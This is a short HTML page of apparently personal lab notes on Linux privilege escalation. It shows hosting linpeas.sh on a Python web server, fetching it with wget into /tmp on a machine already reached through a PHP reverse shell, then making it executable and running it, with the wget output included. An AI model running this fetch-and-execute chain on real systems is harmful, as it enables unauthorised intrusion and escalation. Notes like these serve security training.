@@ -1,0 +1,41 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Privilege Escalation</title>
+</head><body>Will use a tool named Linpeas.<br/>
+website : <a href="https://github.com/carlospolop/PEASS-ng/releases/download/20220807/linpeas.sh">https://github.com/carlospolop/PEASS-ng/releases/download/20220807/linpeas.sh</a><br/>
+<br/>
+will make directory names transfer and paste the linpeas.sh data there.<br/>
+<br/>
+-Now will host a web-server <br/>
+Command : python3 -m http.server 80<br/>
+<br/>
+Now where will we dump the file ?? (i.e. php reverse shell)<br/>
+in /temp directory<br/>
+command : cd /tmp<br/>
+command : pwd<br/>
+command : wget http://192.168.142.128/linpeas.sh<br/>
+<br/>
+$ wget http://192.168.142.128/linpeas.sh<br/>
+--2022-08-23 23:37:03-- http://192.168.142.128/linpeas.sh<br/>
+Connecting to 192.168.142.128:80... connected.<br/>
+HTTP request sent, awaiting response... 200 OK<br/>
+Length: 159251 (156K) [text/x-sh]<br/>
+Saving to: 'linpeas.sh'<br/>
+<br/>
+  0K .......... .......... .......... .......... .......... 32% 11.0M 0s<br/>
+  50K .......... .......... .......... .......... .......... 64% 13.7M 0s<br/>
+ 100K .......... .......... .......... .......... .......... 96% 23.1M 0s<br/>
+ 150K .....                         100% 101M=0.01s<br/>
+<br/>
+2022-08-23 23:37:03 (14.9 MB/s) - 'linpeas.sh' saved [159251/159251]<br/>
+<br/>
+- We have to change the mode<br/>
+command: chmod +x linpeas.sh<br/>
+command: ./linpeas.sh<br/>
+<br/>
+After we run the linpeas.sh we get as the output. (i.e. what we are doing here is that we are establishing a reverse shell with the help of php.sh script and after that we victim send the shell<br/>
+to us and we are downloading the linpeas.sh file which we have downloaded from google and shared via server that we created in transfer file)<br/>
+<br/>
+<br/>
+</body></html>
